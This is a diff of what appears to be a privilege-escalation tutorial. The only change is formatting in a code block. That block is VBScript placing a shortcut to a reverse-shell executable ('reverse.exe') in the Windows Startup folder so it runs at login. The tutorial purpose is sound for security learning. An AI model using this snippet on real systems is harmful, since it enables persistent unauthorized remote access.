@@ -116,10 +116,10 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
    
    - Second: create file & name it "CreateShortcut.vbs" the content of the file is a VBScript code to create a shortcut file of our reverse shell:
    
-`Set oWS= WScript.CreateObject("WScript.Shell")<br />
-sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"<br />
-Set oLink= oWS.CreateShortcut(sLinkFile)<br />
-oLink.TargetPath= "C:\PrivEsc\reverse.exe"<br />
+`Set oWS= WScript.CreateObject("WScript.Shell")
+sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink= oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath= "C:\PrivEsc\reverse.exe"
 oLink.Save`
 
    - Finally: run the script:
